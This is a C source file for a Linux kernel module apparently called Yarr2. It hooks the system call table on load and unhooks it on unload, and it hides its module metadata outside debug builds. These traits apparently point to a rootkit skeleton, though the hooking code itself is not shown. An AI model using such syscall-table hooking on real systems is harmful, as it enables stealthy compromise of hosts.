#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "log.h"
#include "hook.h"

#ifdef DEBUG
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ole");
MODULE_DESCRIPTION("Yarr2 module");
MODULE_VERSION("0.01");
#endif

// TODO: Document all the functions using Doxygen format.

static int __init yarr2_init(void) {
    int err;

    // Hook the system call table.
    yarr_log("Calling hook_syscall_tables()");
    err = hook_syscall_tables();
    if (err) {
        yarr_log("error calling hook_sys_call_tables()\n");
    }

    yarr_log("Returned from hook_syscall_tables()");

    return 0;
}

static void __exit yarr2_exit(void) {
    int err;

    yarr_log("Calling unhook_syscall_tables()");
    err = unhook_syscall_tables();
    if (err) {
        yarr_log("error unhooking the syscall tables");
    }

    yarr_log("Returned from unhook_syscall_tables()");
}

module_init(yarr2_init);
module_exit(yarr2_exit);

